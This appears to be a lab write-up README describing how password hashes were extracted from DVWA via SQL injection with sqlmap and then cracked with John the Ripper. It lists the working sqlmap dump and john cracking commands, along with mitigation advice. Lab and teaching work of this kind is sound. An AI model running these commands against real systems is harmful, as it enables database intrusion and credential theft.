# DVWA Password Hash Cracking using John the Ripper

## 📌 Project Overview
This project demonstrates extracting password hashes via SQL Injection and cracking them using John the Ripper.

## 🎯 Objective
- Extract password hashes from database
- Identify hash type
- Crack passwords using dictionary attack

## 🛠️ Tools Used
- SQLmap
- John the Ripper

## 🌐 Target
DVWA (Local Lab)

---

## ⚙️ Methodology

### Step 1: Extract Hashes (SQL Injection)
sqlmap -u "TARGET_URL" --cookie="COOKIE" -D dvwa -T users --dump

### Step 2: Save Hash
Example hash:
8d3533d75ae2c3966d7e0d4fcc69216b

Saved in file:
hashes.txt

### Step 3: Crack Hash
john --format=Raw-MD5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

### Step 4: Show Cracked Password
john --show hashes.txt

---

## 🔓 Result

Hash:
8d3533d75ae2c3966d7e0d4fcc69216b

Cracked Password:
charley

---

## ⚠️ Security Impact
- Password hashes can be cracked easily
- Weak passwords lead to account compromise
- Database breach exposes user credentials

---

## 🛡️ Mitigation
- Use strong passwords
- Implement hashing with salt (bcrypt, Argon2)
- Avoid MD5 hashing
- Enforce password policies

---

## 📷 Screenshots
See ``

---

## 📚 Learning Outcome
- Understanding password hashing
- Practical hash cracking
- Security risk of weak hashing algorithms

⚠️ This project is performed in a legal DVWA lab environment for educational purposes only.
